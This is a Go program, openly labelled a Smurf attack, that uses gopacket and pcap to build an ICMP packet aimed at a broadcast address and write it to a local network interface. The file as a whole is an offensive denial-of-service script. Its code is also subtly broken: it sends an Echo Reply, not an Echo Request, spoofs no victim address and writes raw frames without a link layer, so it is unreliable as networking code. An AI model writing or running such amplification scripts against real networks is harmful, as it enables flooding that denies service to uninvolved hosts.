package main

import (
	"fmt"
	"log"
	"net"
	"os"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Printf("Usage: %s <source> <broadcast>\n", os.Args[0])
		os.Exit(1)
	}

	srcIP := os.Args[1]
	broadcastIP := os.Args[2]

	// Check IP addresses
	if net.ParseIP(srcIP) == nil || net.ParseIP(broadcastIP) == nil {
		log.Fatalf("Invalid IP addresses provided.")
	}

	// Find network interface to send the packet
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatalf("Failed to list devices: %v", err)
	}

	var selectedDevice *pcap.Interface
	for _, dev := range devices {
		for _, addr := range dev.Addresses {
			if addr.IP != nil && addr.IP.String() == srcIP {
				selectedDevice = &dev
				break
			}
		}
	}

	if selectedDevice == nil {
		log.Fatalf("No suitable device found for IP %s", srcIP)
	}

	// Open handle to send packets on the network interface
	handle, err := pcap.OpenLive(selectedDevice.Name, 65536, false, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Failed to open device: %v", err)
	}
	defer handle.Close()

	// Build ICMP Echo Reply packet
	icmp := layers.ICMPv4{
		TypeCode: layers.ICMPv4TypeEchoReply,
		Id:       0x1234,
		Seq:      1,
	}

	payload := []byte("This is a Smurf attack attempt")

	// Build ICMP encapsulation
	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    net.ParseIP(srcIP),
		DstIP:    net.ParseIP(broadcastIP),
		Protocol: layers.IPProtocolICMPv4,
	}

	// Create a buffer for the packet
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(buffer, options, &ip, &icmp, gopacket.Payload(payload))
	if err != nil {
		log.Fatalf("Failed to serialize packet: %v", err)
	}

	// Send packet
	outgoingPacket := buffer.Bytes()
	if err := handle.WritePacketData(outgoingPacket); err != nil {
		log.Fatalf("Failed to send packet: %v", err)
	}

	fmt.Printf("ICMP Echo Reply sent from %s to %s\n", srcIP, broadcastIP)
}
